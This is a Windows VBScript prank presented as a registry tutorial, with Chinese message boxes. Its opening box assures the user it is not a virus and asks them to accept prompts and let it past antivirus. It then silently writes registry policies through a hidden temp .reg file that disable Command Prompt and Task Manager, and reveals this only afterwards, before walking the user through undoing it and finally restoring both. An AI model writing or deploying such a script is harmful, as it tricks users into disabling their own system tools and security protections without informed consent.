msgbox"下面弹出的两个请选择“是”，否则将无法正常运行。"&chr(10)&"如有杀毒软件阻拦请允许"&chr(10)&"请放心这绝不是病毒，我绝不会坑你电脑，如有问题可以找我"&chr(10)&"QQ：2678743504"
On Error Resume Next : Dim a,b,c:Set WshSHell = WScript.CreateObject("WScript.Shell"):Set FSO = CreateObject("Scripting.FileSystemObject"):Reg2Vbs="Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System]DisableCMD=dword:00000001"
Execute("For i=1 To Len(Reg2Vbs)"&vbCrLf&"TempNum = Asc(Mid(Reg2Vbs,i,1))"&vbCrLf&"If TempNum = 28 Then"&vbCrLf&"TempNum = 13"&vbCrLf&"ElseIf TempNum = 29 Then"&vbCrLf&"TempNum = 10"&vbCrLf&"elseif TempNum=18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"ThisText2 = ThisText2 & chr(TempNum)"&vbCrLf&"Next")
Set RegFile = FSO.OpenTextFile(FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg"),2,True):RegFile.WriteLine(ThisText2):RegFile.Close:WshSHell.Run("regedit /s "&FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")):WScript.Sleep 500:FSO.DeleteFile FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")
On Error Resume Next : Dim d,e,f:Set WshSHell = WScript.CreateObject("WScript.Shell"):Set FSO = CreateObject("Scripting.FileSystemObject"):Reg2Vbs="REGEDIT4[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]DisableTaskmgr=dword:00000001"
Execute("For i=1 To Len(Reg2Vbs)"&vbCrLf&"TempNum = Asc(Mid(Reg2Vbs,i,1))"&vbCrLf&"If TempNum = 28 Then"&vbCrLf&"TempNum = 13"&vbCrLf&"ElseIf TempNum = 29 Then"&vbCrLf&"TempNum = 10"&vbCrLf&"elseif TempNum=18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"ThisText2 = ThisText2 & chr(TempNum)"&vbCrLf&"Next")
Set RegFile = FSO.OpenTextFile(FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg"),2,True):RegFile.WriteLine(ThisText2):RegFile.Close:WshSHell.Run("regedit /s "&FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")):WScript.Sleep 500:FSO.DeleteFile FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")
         Rem 没事的吧，其实你可以直接运行，不必看源码，就是教学。

msgbox"1. 说明：如果你上面两个选择了是，其实我禁用了你的任务管理器和cmd，为了逼迫你学会，抱歉。",64 
msgbox"2. 首先win键（商标键）+r  ，输入“regedit”确定。"
msgbox"3. 然后可以看见标题为注册表编辑器，计算机展开后可以看见几个（一般是5个）HKEY开头的类似文件夹。"
msgbox"4. 然后依次展开“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System”"
msgbox"5. System已经是小阶级，点击它，然后右边会看见名称为“DisableTaskMgr”一项，双击它。"
msgbox"6. 将数值数据由“1”改为“0”（其它不用改）然后确定试试任务管理吧。  别急着关，cmd我也禁用了哦。"
msgbox"7. 这个就作为练习作业了，展开项目说一下“HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System”"
msgbox"8. 接下来就会了吧。（0是正常可以用，1是禁用）其它自己可以尝试。"
msgbox"9. 到这里就结束了，这个是循环的，如果没看懂可以循环回来看。"
msgbox"10. 任务管理器或者taskkill结束吧。"&chr(10)&"再见！"


On Error Resume Next : Dim g,h,i:Set WshSHell = WScript.CreateObject("WScript.Shell"):Set FSO = CreateObject("Scripting.FileSystemObject"):Reg2Vbs="REGEDIT4[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]DisableTaskmgr=dword:00000000"
Execute("For i=1 To Len(Reg2Vbs)"&vbCrLf&"TempNum = Asc(Mid(Reg2Vbs,i,1))"&vbCrLf&"If TempNum = 28 Then"&vbCrLf&"TempNum = 13"&vbCrLf&"ElseIf TempNum = 29 Then"&vbCrLf&"TempNum = 10"&vbCrLf&"elseif TempNum=18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"ThisText2 = ThisText2 & chr(TempNum)"&vbCrLf&"Next")
Set RegFile = FSO.OpenTextFile(FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg"),2,True):RegFile.WriteLine(ThisText2):RegFile.Close:WshSHell.Run("regedit /s "&FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")):WScript.Sleep 500:FSO.DeleteFile FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")
On Error Resume Next : Dim j,k,l:Set WshSHell = WScript.CreateObject("WScript.Shell"):Set FSO = CreateObject("Scripting.FileSystemObject"):Reg2Vbs="Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System]DisableCMD=dword:00000000"
Execute("For i=1 To Len(Reg2Vbs)"&vbCrLf&"TempNum = Asc(Mid(Reg2Vbs,i,1))"&vbCrLf&"If TempNum = 28 Then"&vbCrLf&"TempNum = 13"&vbCrLf&"ElseIf TempNum = 29 Then"&vbCrLf&"TempNum = 10"&vbCrLf&"elseif TempNum=18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"ThisText2 = ThisText2 & chr(TempNum)"&vbCrLf&"Next")
Set RegFile = FSO.OpenTextFile(FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg"),2,True):RegFile.WriteLine(ThisText2):RegFile.Close:WshSHell.Run("regedit /s "&FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")):WScript.Sleep 500:FSO.DeleteFile FSO.BuildPath(FSO.GetSpecialFolder(2),"Temp.reg")




